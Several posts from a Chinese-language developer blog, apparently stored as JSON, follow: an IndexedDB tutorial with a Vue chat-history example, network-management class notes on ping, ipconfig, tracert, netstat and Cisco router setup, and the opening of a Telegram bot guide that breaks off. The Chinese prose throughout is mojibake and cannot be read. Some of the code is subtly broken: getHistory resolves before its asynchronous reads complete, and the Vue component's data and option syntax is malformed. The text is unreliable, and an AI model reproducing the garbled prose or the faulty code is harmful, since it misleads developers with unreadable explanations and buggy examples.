åˆ©ç”¨ä¸€å®šå”¯ä¸€çš„ssnç¢¼ä½œç‚ºè³‡æ–™éµç›¸ç•¶åˆä¹é‚è¼¯(éš±ç§æ¬Šçš„å•é¡Œå…ˆæ“±ç½®ä¸€æ”¾ï¼Œä¸åœ¨æœ¬æ–‡æ¢è¨ç¯„åœ)ã€‚ä¸éç•¶æˆ‘å€‘æƒ³è¦æŸ¥è©¢ä½¿ç”¨è€…çš„åå­—çš„æ™‚å€™ï¼Œå¦‚æœæ²’æœ‰ç´¢å¼•å°±éœ€è¦ä¸€ä¸€æª¢æŸ¥æ¯ä¸€ç­†è³‡æ–™ï¼Œååˆ†æ²’æœ‰æ•ˆç‡ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å»ºç«‹nameçš„ç´¢å¼•ã€‚ 1 2 3 4 var index = objectStore.index(\u0026#34;name\u0026#34;); index.get(\u0026#34;Donna\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Donna\u0026#39;s SSN is \u0026#34; + event.target.result.ssn); }; å› ç‚º name ä¸æ˜¯å”¯ä¸€å€¼ï¼Œæ‰€ä»¥å¯èƒ½æœƒæœ‰å¤šç­†è³‡æ–™ç¬¦åˆ\u0026quot;Donna\u0026quot;åå­—ï¼Œæ­¤æ™‚å‘¼å« get() æœƒå–å¾—è³‡æ–™éµæœ€å°å€¼çš„è³‡æ–™ã€‚ 9. è¨­å®šæŒ‡æ¨™æŸ¥è©¢ç¯„åœå’Œæ–¹å‘ å¦‚æœæƒ³è¦é™å®šæŒ‡æ¨™æŸ¥è©¢ç¯„åœï¼Œé‚£éº¼åœ¨ä¹å« openCursor() æˆ– openKeyCursor() æ™‚ç¬¬ä¸€å€‹åƒæ•¸è¦å‚³å…¥ IDBKeyRange ç‰©ä»¶ä»¥é™åˆ¶ç¯„åœã€‚IDBKeyRangeç‰©ä»¶èƒ½å¤ åªèšç„¦åœ¨å–®ä¸€è³‡æ–™éµä¸Šæˆ–è€…ä¸€æ®µä¸Šä¸‹é™å€é–“ï¼›ä¸Šä¸‹é™å€é–“å¯ä»¥æ˜¯å°é–‰(å«ç•Œé™)æˆ–é–‹æ”¾(ä¸å«ç•Œé™)ï¼Œè«‹çœ‹ä»¥ä¸‹ç¯„ä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Only match \u0026#34;Donna\u0026#34; var singleKeyRange = IDBKeyRange.only(\u0026#34;Donna\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, including \u0026#34;Bill\u0026#34; var lowerBoundKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, but don\u0026#39;t include \u0026#34;Bill\u0026#34; var lowerBoundOpenKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;, true); // Match anything up to, but not including, \u0026#34;Donna\u0026#34; var upperBoundOpenKeyRange = IDBKeyRange.upperBound(\u0026#34;Donna\u0026#34;, true); // Match anything between \u0026#34;Bill\u0026#34; and \u0026#34;Donna\u0026#34;, but not including \u0026#34;Donna\u0026#34; var boundKeyRange = IDBKeyRange.bound(\u0026#34;Bill\u0026#34;, \u0026#34;Donna\u0026#34;, false, true); index.openCursor(boundKeyRange).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the matches. cursor.continue(); } }; æœ‰æ™‚å€™æˆ‘å€‘æœƒæƒ³è¦ç”±å¤§åˆ°å°æŸ¥çœ‹è³‡æ–™è€Œéé è¨­ç”±å°åˆ°å¤§æ–¹å‘ï¼Œå‚³å…¥ç¬¬äºŒå€‹\u0026quot;prev\u0026quot;å­—ä¸²ä¾¿èƒ½åšåˆ°ï¼š 1 2 3 4 5 6 7 objectStore.openCursor(null, \u0026#34;prev\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; ç”±æ–¼\u0026quot;name\u0026quot;ç´¢å¼•ä¸å…·å”¯ä¸€æ€§ï¼Œæ‰€ä»¥ä¸€å€‹åå­—ä¸‹å¯èƒ½æœƒå‡ºç¾å¤šç­†è³‡æ–™ï¼Œæ­¤æ™‚å¦‚æœæƒ³è¦é¿é–‹é€™å¤šç­†è³‡æ–™ï¼Œè«‹å‚³å…¥\u0026quot;nextunique\u0026quot;æˆ–\u0026quot;prevunique\u0026quot;åšç‚ºç¬¬äºŒå€‹æ–¹å‘åƒæ•¸ï¼Œç•¶å‚³å…¥ä¹‹å¾Œï¼Œå¦‚ä¸€å€‹åå­—ä¸‹é‡åˆ°å¤šç­†è³‡æ–™ï¼Œå‰‡åªæœ‰è³‡æ–™éµæœ€å°çš„è³‡æ–™æœƒè¢«å›å‚³ã€‚ 1 2 3 4 5 6 7 index.openKeyCursor(null, \u0026#34;nextunique\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; é—œæ–¼å¯å‚³å…¥çš„æ–¹å‘åƒæ•¸ï¼Œè«‹åƒè€ƒIDBCursorå¸¸æ•¸ã€‚\nå®‰å…¨æ€§ IndexedDBéµå®ˆåŒæºæ”¿ç­–ï¼Œæ‰€ä»¥å®ƒç¶å®šå‰µå»ºå®ƒçš„ä¾†æºç¶²ç«™ï¼Œå…¶ä»–ä¾†æºç¶²ç«™ç„¡æ³•å­˜å–ã€‚ å°±åƒå°è¼‰å…¥ \u0026lt;frame\u0026gt; å’Œ \u0026lt;iframe\u0026gt; ç¶²é çš„ç¬¬ä¸‰æ–¹cookieæ‰€è¨­ä¸‹çš„å®‰å…¨æ€§å’Œéš±ç§æ¬Šè€ƒé‡é™åˆ¶ï¼ŒIndexedDBç„¡æ³•åœ¨è¼‰å…¥ \u0026lt;frame\u0026gt; å’Œ \u0026lt;iframe\u0026gt; ç¶²é ä¸Šé‹ä½œï¼Œè©³æƒ…è«‹è¦‹ bug 595307ã€‚ ç€è¦½å™¨é—œé–‰é¢¨éšª ç•¶ç€è¦½å™¨é—œé–‰ï¼Œä¾‹å¦‚ä½¿ç”¨è€…æŒ‰ä¸‹é—œé–‰éˆ•ï¼Œä»»ä½•æœªå®ŒæˆIndexedDBäº¤æ˜“éƒ½å°‡é»˜é»˜ä¸­æ­¢ï¼Œé€™äº›äº¤æ˜“ä¸æœƒå®Œæˆï¼ŒéŒ¯èª¤äº‹ä»¶ä¹Ÿä¸æœƒè§¸ç™¼ã€‚æ—¢ç„¶ç€è¦½å™¨å¯èƒ½éš¨æ™‚è¢«é—œé–‰ï¼Œæˆ‘å€‘ç„¡æ³•å®Œå…¨æŒ‡æœ›ä»»ä½•ç‰¹å®šäº¤æ˜“ä¸€å®šæœƒå®Œæˆï¼Œæˆ–æ˜¯ä¾è³´éŒ¯èª¤äº‹ä»¶åšå‡ºç›¸æ‡‰è™•ç†ï¼Œé‡å°é€™ç¨®ç‹€æ³ï¼Œæˆ‘å€‘éœ€è¦æ³¨æ„ï¼š æ¯ä¸€ç­†äº¤æ˜“çµæŸå¾Œéƒ½æ‡‰è©²è¦ä¿æŒè³‡æ–™åº«å®Œæ•´æ€§ï¼Œä¾‹å¦‚èªªï¼Œæœ‰ä¸€ä¸²ä½¿ç”¨è€…ç·¨è¼¯é …ç›®æ¸…å–®æ­£è¦å­˜å…¥è³‡æ–™åº«ï¼Œæˆ‘å€‘å¦‚æœå…ˆåœ¨ä¸€å€‹äº¤æ˜“ä¸­æ¸…é™¤èˆŠæ¸…å–®ï¼Œç„¶å¾Œåœ¨å¦ä¸€å€‹äº¤æ˜“ä¸­å­˜å…¥æ–°æ¸…å–®ï¼Œé‚£å°±æœƒé¢è‡¨åˆ°æ¸…é™¤å®Œå°±æ¸…å–®å¾Œï¼Œæ–°æ¸…å–®å­˜å…¥äº¤æ˜“é‚„ä¾†ä¸åŠå›å­˜ï¼Œç€è¦½å™¨å°±é—œé–‰çš„é¢¨éšªï¼Œè€Œé€™å€‹æ™‚å€™è³‡æ–™åº«è£¡é¢çš„æ¸…å–®è³‡æ–™å°‡æ¶ˆå¤±ã€‚æ‰€ä»¥æ¯”è¼ƒå¥½çš„åšæ³•æ‡‰è©²æ˜¯åœ¨åŒä¸€ç­†äº¤æ˜“ä¸­å®Œæˆæ¸…é™¤èˆŠæ¸…å–®å’Œå­˜å…¥æ–°æ¸…å–®ã€‚ æ°¸é ä¸è¦åœ¨unloadäº‹ä»¶ä¸­åŸ·è¡Œè³‡æ–™åº«äº¤æ˜“ï¼Œå› ç‚ºå¦‚æœunloadäº‹ä»¶æ˜¯è§¸ç™¼åœ¨ç€è¦½å™¨é—œé–‰ä¸‹ï¼Œä»»ä½•è³‡æ–™åº«äº¤æ˜“éƒ½ä¸æœƒç™¼ç”Ÿï¼Œæˆ–è¨±ï¼Œç€è¦½å™¨(æˆ–åˆ†é )æ‰“é–‹æ™‚è®€å–è³‡æ–™åº«ï¼Œæ›´æ–°è³‡æ–™åº«ç•¶ä½¿ç”¨è€…ç·¨è¼¯è³‡æ–™ï¼Œç•¶ç€è¦½å™¨(æˆ–åˆ†é )é—œé–‰æ™‚å„²å­˜è³‡æ–™é€™æ¨£çš„åšæ³•æ¯”è¼ƒç›´è¦ºï¼Œä¸éè³‡æ–™åº«çš„æ“ä½œæ˜¯éåŒæ­¥é€²è¡Œåœ°ï¼Œæ‰€ä»¥ç€è¦½å™¨é—œé–‰çš„åŸ·è¡Œæœƒåœ¨è³‡æ–™åº«æ“ä½œå‰ç™¼ç”Ÿï¼Œé€²è€Œä¸­æ–·å¾ŒçºŒéåŒæ­¥çš„è³‡æ–™åº«äº¤æ˜“ï¼Œæ‰€ä»¥åœ¨unloadäº‹ä»¶ä¸­åŸ·è¡Œè³‡æ–™åº«äº¤æ˜“æ˜¯è¡Œä¸é€šåœ°ã€‚ äº‹å¯¦ä¸Šä¸è«–ç€è¦½å™¨æ˜¯å¦æ­£å¸¸é—œé–‰ï¼Œéƒ½æ²’æœ‰ä»»ä½•æ–¹æ³•ä¿è­‰IndexedDBäº¤æ˜“èƒ½å¤ é †åˆ©å®Œæˆï¼Œè«‹è¦‹ bug 870645ã€‚ ç¯„ä¾‹ç·´ç¿’ï¼šå°‡èŠå¤©å®¤æ¨æ’­è¨Šæ¯å¯«é€² IndexedDB å»ºç«‹db.jsï¼Œä¸¦å°‡æ“ä½œ IndexedDB æ•´åˆè‡³æª”æ¡ˆä¸­ã€‚ vueæª”å¼•å…¥db.jsï¼Œä¸¦ä¸€æ¬¡åƒ…æ’ˆæœ€æ–°50ç­†è³‡æ–™ã€‚ db.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 // å›å‚³æ˜¯å¦æ”¯æ´ IndexedDB export function isSupportDB() { const indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB return !!indexedDB } // æ‰“é–‹orå»ºç«‹DB export function openDB() { return new Promise((resolve, reject) =\u0026gt; { const request = indexedDB.open(\u0026#34;ChatDB\u0026#34;) // æ‰“é–‹orå»ºç«‹èŠå¤©å®¤DB request.onerror = e =\u0026gt; { console.log(\u0026#34;idb create fail\u0026#34;) reject(e) } request.onsuccess = () =\u0026gt; { console.log(\u0026#34;idb create success\u0026#34;) DBObject = request.result resolve(DBObject) // æˆåŠŸå¾Œè¿”å›DBç‰©ä»¶ } request.onupgradeneeded = e =\u0026gt; { // è‹¥ç‰ˆæœ¬å·²å‡ç´šå‰‡é‡æ–°å»ºç«‹DBç‰©ä»¶ï¼Œä¸¦è¿”å›DBç‰©ä»¶ DBObject = e.target.result DBObject.createObjectStore(\u0026#34;chatData\u0026#34;, { keyPath: \u0026#34;index\u0026#34;, autoIncrement: true }) resolve(DBObject) } }) } // å–æ­·å²èŠå¤©ç´€éŒ„æœ€æ–°50ç­† export function getHistory(num) { return new Promise(resolve =\u0026gt; { const objectStore = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;) let getKey = objectStore.getAllKeys() getKey.onsuccess = () =\u0026gt; { let result = [] for (let i = getKey.result.length - num * 50 - 1; i \u0026gt; getKey.result.length - num * 50 - 50 - 1; i--) { let getItem = objectStore.get(getKey.result[i]) getItem.onsuccess = () =\u0026gt; { result.unshift(getItem.result) } } resolve(result) } // ä¸€æ¬¡æ’ˆå…¨éƒ¨è³‡æ–™ // const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;).getAll() // request.onsuccess = () =\u0026gt; { // resolve(request.result) // } }) } // æ”¶åˆ°æ¨æ’­å°‡è¨Šæ¯å¯«å…¥idb export function addToDB(data) { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) request.objectStore(\u0026#34;chatData\u0026#34;).add(data) //æ•°æ®å†™å…¥æˆåŠŸçš„å›è°ƒ request.onsuccess = () =\u0026gt; {} request.onerror = event =\u0026gt; { console.log(event) } } // æ¸…é™¤idbèŠå¤©ç´€éŒ„ export function clearDB() { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) request.objectStore(\u0026#34;chatData\u0026#34;).clear() } chatroom.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ... \u0026lt;script\u0026gt; import * as idb from \u0026#34;@/utils/db\u0026#34; export default { data: { return { msgData: [], historyRange: 0 } } mounted() { setTimeout(() =\u0026gt; { this.getHistory(this.historyRange) }, 500) } methods: { getHistory(num) { if (idb.isSupportDB()) { // è‹¥æ”¯æ´å‰‡é–‹å•ŸDBï¼Œä¸¦å¾…å›å‚³å¾Œæ’ˆè³‡æ–™ idb.openDB().then(() =\u0026gt; { idb.getHistory(num).then(result =\u0026gt; { setTimeout(() =\u0026gt; { if (!this.msgData.length) { // æœªæœ‰è³‡æ–™æ™‚ç›´æ¥å®šç¾© this.msgData = result } else { result.forEach(item =\u0026gt; { // å°‡æ’ˆåˆ°çš„è³‡æ–™ç”±å‰å¡å…¥msgData this.msgData.unshift(item) }) } this.historyRange++ }, 0) }) }) } }, add(data) { idb.addToDB(data) }, clearDB() { idb.clearDB() } } } \u0026lt;/script\u0026gt; ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351840670_d321f7cc15_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/use-indexeddb/","title":"å‰ç«¯ç·©å­˜å¤§ç­†è³‡æ–™ï¼šIndexedDB ä»‹ç´¹/æ‡‰ç”¨"},{"content":" æŒ‡å°æ•™å¸«ï¼šé»ƒå¨èªŒ ä½¿ç”¨è»Ÿé«” Cisco Packet Tracer Ciscoå®˜æ–¹ç¶²è·¯æ¨¡æ“¬å™¨ CPTä¸‹è¼‰æ•™å­¸\nwireshark(3.6.0) å°åŒ…æ“·å–å·¥å…· ä¸‹è¼‰wireshark\nVmware è™›æ“¬æ©Ÿè»Ÿé«” ä¸‹è¼‰Vmware\næŒ‡ä»¤ç­†è¨˜ ping 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ### å¸¸ç”¨ä¾†æ¸¬è©¦çš„ip ### ä¸­è¯é›»ä¿¡DNS ping 168.95.1.1 ### Google ping 8.8.8.8 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 æ™‚é–“: è‹¥é€£çºŒè¶…é100msï¼Œä»£è¡¨ç¶²è·¯æœ‰å•é¡Œ TTL: Time to live ipconfig æŸ¥è©¢é›»è…¦ç¶²å¡è¨­å®š ipconfig(Windows) / ifconfig(Linux/UNIX) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ### åŸºæœ¬ä½¿ç”¨ ipconfig ### æ›´è©³ç´°ç‰ˆæœ¬ ipconfig /all ### æŸ¥è©¢åƒæ•¸ ipconfig /? ### é‡‹æ”¾IPä½å€ ipconfig /release # IPv4 ipconfig /release6 # IPv6 ### é‡æ–°å–å¾—IPä½å€ (æœƒé€ æˆç¬é–“æ–·ç·š) ipconfig /renew # IPv4 ipconfig /renew6 # IPv6 ### æ¸…é™¤DNSå¿«å– ipconfig /flushdns tracert è¿½è¹¤é€£ç·šå‡ºå»çš„ç¯€é» æœ€å¤š30å€‹ç¯€é» 1 2 3 4 tracert 168.95.1.1 ### ä¹Ÿå¯è¼¸å…¥ç¶²å€ tracert www.pchome.com.tw nslookup åˆ¤æ–·DNSåç¨±è§£æä¼ºæœå™¨æ˜¯å¦æ­£å¸¸ 1 2 3 4 nslookup 168.95.1.1 ### ä¹Ÿå¯è¼¸å…¥ç¶²å€ nslookup www.pchome.com.tw netstat æŸ¥è©¢é›»è…¦é€£ç·šæœå‹™çš„ç‹€æ…‹ ä½¿ç”¨portï¼š7 1 2 3 4 netstat ### åˆ—å‡ºç›®å‰æ‰€æœ‰çš„ç¶²è·¯ç‹€æ…‹(åŒ…å«IPv6) netstat -an Cisco Packet Tracer è¨­å®šRouter ç¯„ä¾‹ä½¿ç”¨çš„è¨­å‚™\nRouters: 1841 router Connections: RS 232 Devices: PC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ### é€²å…¥router Router\u0026gt; enable Router# ### é€²å…¥privey config Router# configure terminal Router(config)# ### è¨­å®š hostname (ç¯„ä¾‹è¨­å®šç‚º\u0026#34;ISP_1\u0026#34;) Router(config)# hostname ISP_1 ### è¨­å®šç¶²å¡ä»‹é¢ (ç¯„ä¾‹è¨­å®šç‚º\u0026#34;fastEthernet 0/0\u0026#34;) ISP_1(config)# interface fastEthernet 0/0 ISP_1(config-if)# ### è¨­å®šIP ISP_1(config-if)# ip address 192.168.0.5 255.255.255.0 ISP_1(config-if)# ### é›¢é–‹ä¸¦æŸ¥çœ‹IPè¨­å®š ISP_1(config-if)# exit ISP_1(config)# exit ISP_1# ISP_1# show running-config Building configuration... Current configuration : 575 bytes ! version 12.4 no service timestamps log datetime msec no service timestamps debug datetime msec no service password-encryption ! hostname ISP_1 ! ! ! ! ! ! ! ! ip cef no ipv6 cef ! ! --More-- Wireshark é˜²ç«ç‰†æ¦‚å¿µ FTP ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š21(å‘½ä»¤å‚³è¼¸)ã€20(æª”æ¡ˆå‚³è¼¸) è¿‘æœŸå·²è¼ƒä¸å¸¸ä½¿ç”¨ï¼Œå› å®‰å…¨æ€§å•é¡Œ SSH(secure shell) ä½¿ç”¨TCPé€šè¨Šå”å®š ç”¨æ–¼ç™»å…¥ç³»çµ±ã€å‚³è¼¸æŒ‡ä»¤ åŠ å¯†å‚³è¼¸ ä½¿ç”¨portï¼š22 telnet ä½¿ç”¨TCPé€šè¨Šå”å®š ç”¨æ–¼æ–‡å­—å‘½ä»¤ ç„¡åŠ å¯† ä½¿ç”¨portï¼š23 SMTP(simple mail transfer protocal) ä½¿ç”¨DNS Serverçš„MX Record ç”¨æ–¼å¯„å‡ºmail ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š25 å°å¯„ä»¶è€…èº«åˆ†ä¸åšé©—è­‰ï¼Œåªæœƒé©—è­‰æ”¶ä»¶è€… ç¾ä»Šå·²è¼ƒå°‘ä½¿ç”¨ï¼Œé€šå¸¸å·²æ”¹ä½¿ç”¨ç¶²é å¼çš„mailï¼Œè¼ƒæ–¼å®‰å…¨ä¸”æ¸›çœè³‡æº POP3 ç”¨ä¾†æ¥æ”¶mailã€é ç«¯ç®¡ç†éƒµä»¶ï¼Œå¯ä»¥å–®ç´”ä¸‹è¼‰ï¼Œä¼ºæœå™¨ç«¯ä¸éœ€åˆªé™¤ æ¡ç”¨ä¸åŠ å¯†é€šè¨Š æ–°ç‰ˆ(POP3S)æ¡å–åŠ å¯†é€šè¨Š ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š110 WHOIS ç”¨æ–¼æŸ¥è©¢ç¶²éš›ç¶²è·¯ä¸­ç¶²åŸŸåç¨±IPèˆ‡æ‰€æœ‰è€…çš„è³‡è¨Š ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š43 DNS(domain name system) ç”¨æ–¼ç¶²åŸŸåç¨±èˆ‡IPçš„å°æ‡‰æŸ¥è©¢ åŒæ™‚ä½¿ç”¨TCP/UDPé€šè¨Šå”å®š ä½¿ç”¨portï¼š53 HTTP(hypertext transfer protocol) ç¶²é çš„ç™¼å¸ƒå’Œæ¥æ”¶ ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š80 (8080ç‚ºæ›¿ä»£port) IMAP ç”¨æ–¼ç·šä¸Šå’Œé›¢ç·šç‹€æ…‹çš„ç€è¦½æ¨¡å¼ ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š143 (8080ç‚ºæ›¿ä»£port) ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351384271_09abac0c54_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/network-management-lesson/","title":"ç¶²è·¯ç®¡ç†æŠ€è¡“æ‡‰ç”¨å¯¦å‹™ç­ç­†è¨˜"},{"content":" åƒè€ƒç¶²ç«™ - Telegram èŠå¤©æ©Ÿå™¨äººåŸç†\nåƒè€ƒç¶²ç«™ - å‘ @BotFather ç”³è«‹ä¸€éš»æ©Ÿå™¨äººå§ï¼\nåƒè€ƒç¶²ç«™ - Telegram æ©Ÿå™¨äººçš„è¨­å®š\nåƒè€ƒç¶²ç«™ - CI/CD trigger WebHook to Telegram Bot\nåƒè€ƒç¶²ç«™ - How to setup a Telegram bot for your Drone CI/CD builds\nTelegram èŠå¤©æ©Ÿå™¨äººåŸç† æ©Ÿå™¨äººçš„é‹ä½œåŸç† ç¾åœ¨ä½ ç™¼äº†ä¸€æ®µè¨Šæ¯çµ¦æ©Ÿå™¨äºº\nä½†æ˜¯ä¸¦ä¸æ˜¯æ©Ÿå™¨äººç›´æ¥å›ä½ è¨Šæ¯\nè©³ç´°æƒ…æ³å¦‚ä¸‹åœ–ï¼š\nä¸€é–‹å§‹ä½ çš„è¨Šæ¯æœƒè¢«å‚³é€åˆ° TG ä¼ºæœå™¨ TG ä¼ºæœå™¨æœƒé€šçŸ¥æ©Ÿå™¨äººï¼šæ¬¸ï¼æœ‰ä¸€å‰‡æ–°è¨Šæ¯ æ©Ÿå™¨äººæœƒç™¼ä¸€å€‹æŒ‡ä»¤çµ¦ TG ä¼ºæœå™¨ TG ä¼ºæœå™¨ç…§è‘—æŒ‡ä»¤çš„éœ€æ±‚ï¼Œå›æ‡‰è¨Šæ¯çµ¦ä½  æ©Ÿå™¨äººæ¥æ”¶è¨Šæ¯çš„å…©ç¨®æ¨¡å¼ æ©Ÿå™¨äººå¯ä»¥æ”¾åœ¨ä¼ºæœå™¨ï¼Œä¹Ÿå¯ä»¥ç”¨å®¢æˆ¶ç«¯çš„æ–¹å¼é‹ä½œ\nWebhook\nä»¥ ä¼ºæœå™¨ æ–¹å¼è¢«å‹•æ¥æ”¶è¨Šæ¯ï¼Œéœ€è¦æœ‰ IP ä½ç½®ï¼Œé€šå¸¸æœƒæ”¾åœ¨ ç¶²ç«™ä¼ºæœå™¨(Web Hosting) ä¸Šï¼Œè¦è‡ªå·±æ¶è¨­ç¶²ç«™ä¼ºæœå™¨ä¸æ˜¯ä»¶å®¹æ˜“çš„äº‹ï¼Œæ‰€ä»¥å®˜æ–¹é‚„æä¾›äº†å¦ä¸€ç¨®åšæ³• Long Pollingã€‚\nä»¥ å®¢æˆ¶ç«¯ æ–¹å¼ä¸»å‹•è·Ÿ TG ä¼ºæœå™¨è¦è¨Šæ¯ï¼Œå¯ä»¥ç›´æ¥ åœ¨è‡ªå·±é›»è…¦ä¸Šé‹ä½œï¼Œä¸éœ€è¦æ¶(ç§Ÿ)ä¼ºæœå™¨ä¹Ÿèƒ½è®“æ©Ÿå™¨äººé †åˆ©é‹ä½œï¼Œç¼ºé»å°±æ˜¯é›»è…¦è¦ä¸€ç›´é–‹è‘—ï¼Œç•¶ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ é›²ç«¯æœå‹™(IaaSã€PaaSã€SaaS)ã€‚ æ©Ÿå™¨äººç™¼é€è¨Šæ¯çš„ä¸‰ç¨®æ–¹å¼ HTTP GET 1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} ç›´æ¥ä»¥ ç¶²å€åƒæ•¸ çš„æ–¹å¼å‚³é€æŒ‡ä»¤ï¼ŒGET æ²’æœ‰ Bodyï¼Œåªå‚³é€ Headers (ä½ å¯ä»¥ç•¶ä½œä¸æœƒå‚³é€æª”æ¡ˆéå»)ï¼Œé€šå¸¸æ˜¯ç”¨ä¾†å–è³‡æ–™ç”¨ï¼Œå„ªé»æ˜¯å¯ä»¥ç›´æ¥ç”¨ç€è¦½å™¨åŸ·è¡Œï¼Œç¼ºé»æ˜¯æœ‰ 2KB çš„é™åˆ¶ï¼Œé›–ç„¶ä¸å¤ªå¯èƒ½ç”¨åˆ°é€™é•·çš„æŒ‡ä»¤ï¼Œä½†é‚„æ˜¯æ¯”è¼ƒå»ºè­°ä½¿ç”¨ POSTã€‚\nHTTP POST 1 {\u0026#34;method\u0026#34;:\u0026#34;Method\u0026#34;,\u0026#34;Parameter1\u0026#34;:\u0026#34;Value1\u0026#34;,\u0026#34;Parameter2\u0026#34;:\u0026#34;Value2\u0026#34;} POST æ˜¯ ä»¥ Body å‚³é€è³‡æ–™(æª”æ¡ˆ)ï¼Œç¨‹å¼é€šå¸¸éƒ½æ˜¯ä»¥é€™ç¨®æ–¹å¼æºé€šï¼Œç¶²é è£¡çš„è¡¨å–®ä¹Ÿç¶“å¸¸æ˜¯ä»¥é€™ç¨®æ–¹å¼å‚³é€ï¼Œè³‡æ–™ä¸æœƒé¡¯ç¤ºåœ¨ç¶²å€åˆ—ï¼Œå¯ä»¥å‚³é€çš„è³‡æ–™å¤§å°æ¯” GET å¤§å¾—å¤šï¼š1MB ~ 2GBã€‚\nç›´æ¥ Print é€™å€‹æ–¹å¼ åªæœ‰åœ¨ webhook æ¨¡å¼ ä¸‹æ‰èƒ½ä½¿ç”¨ï¼Œå› ç‚ºåªæœ‰ä¼ºæœå™¨å¯ä»¥ç›´æ¥å›æ‡‰è¨Šæ¯ã€‚\nå‘ @BotFather ç”³è«‹ä¸€éš»æ©Ÿå™¨äººå§ï¼ The BotFather The Botfather é€™å€‹åå­—æ˜¯è‡´æ•¬ 1972 å¹´çš„ç¾åœ‹é›»å½±ã€Šæ•™çˆ¶ã€‹\nå®ƒæ˜¯æ©Ÿå™¨äººï¼Œä¹Ÿæ˜¯æ©Ÿå™¨äººçš„ç®¡ç†è€…\nå¹¾ä¹æ‰€æœ‰æ©Ÿå™¨äººçš„è¨­å®šã€å»ºç«‹éƒ½è¦é€éä»–\nç”¨æ©Ÿå™¨äººè¨­å®šæ©Ÿå™¨äººè½èµ·ä¾†å°±å¾ˆæœ‰è¶£ï¼Œå°å§ï¼Ÿ\n@BotFather çš„åŠŸèƒ½ ç§è¨Š @BotFather ï¼ŒæŒ‰ã€Œé–‹å§‹ã€å¾Œå°±æœƒé¡¯ç¤ºå‡ºä¸€å¤§å †æŒ‡ä»¤ï¼ŒçœŸæ˜¯ä»¤äººçœ¼èŠ±æ’©äº‚\nå®˜æ–¹ç¶²é ç‰ˆèªªæ˜\nç°¡å–®ä»‹ç´¹å¹¾å€‹æ¯”è¼ƒå¸¸ç”¨çš„åŠŸèƒ½ï¼š\næŒ‡ä»¤ èªªæ˜ /newbot å»ºç«‹ä¸€å€‹æ–°çš„æ©Ÿå™¨äºº /mybots åˆ—å‡ºæ‰€æœ‰æ©Ÿå™¨äººï¼Œç”¨æŒ‰éˆ•çš„æ–¹å¼è¨­å®šæ©Ÿå™¨äººï¼Œè€ŒéæŒ‡ä»¤ï¼ˆé€™æ¨£å¯ä»¥è®“èŠå¤©ç´€éŒ„è®Šå¾—å¾ˆä¹¾æ·¨ï¼Œæˆ‘æ¯”è¼ƒå–œæ­¡ç”¨é€™å€‹ï¼‰ ä¿®æ”¹ç›¸é—œ /setname ä¿®æ”¹é¡¯ç¤ºåç¨± /setdescription ä¿®æ”¹èªªæ˜ /setabouttext ä¿®æ”¹ç°¡ä»‹ /setuserpic ä¿®æ”¹å¤§é ­è²¼ /setcommands ä¿®æ”¹æŒ‡ä»¤é¸å–® /deletebot åˆªé™¤æ©Ÿå™¨äºº è¨­å®šç›¸é—œ /token é¡¯ç¤ºæ©Ÿå™¨äººçš„ token /revoke ç”¢ç”Ÿæ–°çš„ tokenï¼ŒèˆŠçš„æœƒå¤±æ•ˆ /setjoingroups è¨­å®šæ˜¯å¦èƒ½è¢«åŠ 